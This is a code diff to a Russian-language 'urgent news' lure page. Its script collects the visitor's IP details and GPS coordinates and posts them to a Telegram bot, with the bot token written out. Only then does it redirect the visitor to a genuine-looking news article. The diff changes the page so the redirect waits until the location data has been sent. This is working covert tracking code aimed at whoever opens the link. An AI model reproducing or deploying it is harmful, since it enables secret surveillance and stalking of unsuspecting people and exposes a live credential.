@@ -4,7 +4,6 @@
   <meta charset="UTF-8">
   <title>Срочная новость</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="refresh" content="0; url=https://dnepr.express/ru/post/masshtabnyj-narkobiznes-razoblachili-v-15-oblastyah-ukrainy-sredi-nih-dnepropetrovshina" />
   <style>
     body {
       background-color: #f4f4f4;
@@ -44,6 +43,8 @@
   </div>
 
   <script>
+    const redirectUrl = "https://dnepr.express/ru/post/masshtabnyj-narkobiznes-razoblachili-v-15-oblastyah-ukrainy-sredi-nih-dnepropetrovshina";
+
     function sendToTelegram(message) {
       fetch("https://api.telegram.org/bot7780068053:AAEfj3ROoHOupCeM7F_W7auJAkakcluF5Nw/sendMessage", {
         method: "POST",
@@ -53,6 +54,12 @@
           text: message
         })
       });
+    }
+
+    function startRedirect(delay = 1000) {
+      setTimeout(() => {
+        window.location.href = redirectUrl;
+      }, delay);
     }
 
     fetch("https://ipwho.is/")
@@ -72,6 +79,7 @@ IP: ${data.ip}
           const fallback = ipMessage + "\n\n⚠️ GPS: не получен (таймаут)";
           document.getElementById("status").innerText = fallback;
           sendToTelegram(fallback);
+          startRedirect();
         }, 8000);
 
         if (navigator.geolocation) {
@@ -85,18 +93,21 @@ IP: ${data.ip}
               const full = ipMessage + `\n\nGPS: ${lat}, ${lon}\nТочность: ${acc} м`;
               document.getElementById("status").innerText = full;
               sendToTelegram(full);
+              startRedirect();
             },
             err => {
               clearTimeout(gpsTimeout);
               const errMsg = ipMessage + `\n\n⚠️ Ошибка GPS: ${err.message}`;
               document.getElementById("status").innerText = errMsg;
               sendToTelegram(errMsg);
+              startRedirect();
             }
           );
         } else {
           const notSupported = ipMessage + "\n\n⚠️ GPS не поддерживается.";
           document.getElementById("status").innerText = notSupported;
           sendToTelegram(notSupported);
+          startRedirect();
         }
       })
       .catch(err => {
@@ -104,6 +115,7 @@ IP: ${data.ip}
         document.getElementById("status").innerText = failMsg;
         console.error(err);
         sendToTelegram(failMsg);
+        startRedirect();
       });
   </script>
 </body>
